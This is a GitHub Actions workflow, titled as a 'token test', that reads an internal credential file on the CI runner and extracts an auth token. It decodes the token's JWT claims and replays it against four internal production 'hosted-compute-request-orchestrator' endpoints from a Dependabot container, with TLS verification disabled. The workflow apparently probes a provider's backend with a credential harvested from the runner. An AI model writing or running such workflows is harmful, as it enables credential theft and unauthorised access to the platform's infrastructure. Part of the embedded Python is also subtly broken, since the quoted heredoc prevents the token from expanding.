name: Fresh Token Test
on:
  push:
    branches: [master]
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - run: |
          SETTINGS=$(cat /opt/hca/.settings)
          AUTH=$(python3 -c "import json;print(json.loads('''$SETTINGS''')['authToken'])")
          
          echo "=== Fresh JWT kid ==="
          python3 << 'PYEOF'
import base64, json
token = """$AUTH"""
def b64d(x):
    x += '=='[:(4-len(x)%4)%4]
    x = x.replace('-','+').replace('_','/')
    return base64.b64decode(x)
h = json.loads(b64d(token.split('.')[0]))
p = json.loads(b64d(token.split('.')[1]))
print(f"kid: {h.get('kid')}")
print(f"iss: {p.get('iss')}")
print(f"sub: {p.get('sub')}")
print(f"env: {p.get('env')}")
print(f"reg: {p.get('reg')}")
print(f"vmn: {p.get('vmn')}")
PYEOF
          
          echo ""
          echo "=== Test: eus-02 with FRESH token ==="
          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
            curl -sk --connect-timeout 5 \
              -H "Authorization: Bearer $AUTH" \
              "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/" 2>&1
          
          echo ""
          echo "=== Test: eus-01 with FRESH token ==="
          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
            curl -sk --connect-timeout 5 \
              -H "Authorization: Bearer $AUTH" \
              "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/v1/" 2>&1
          
          echo ""
          echo "=== Test: iad-01 with FRESH token ==="
          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
            curl -sk --connect-timeout 5 \
              -H "Authorization: Bearer $AUTH" \
              "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/v1/" 2>&1
          
          echo ""
          echo "=== Test: iad-02 with FRESH token ==="
          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
            curl -sk --connect-timeout 5 \
              -H "Authorization: Bearer $AUTH" \
              "https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/v1/" 2>&1
          
          echo "=== DONE ==="
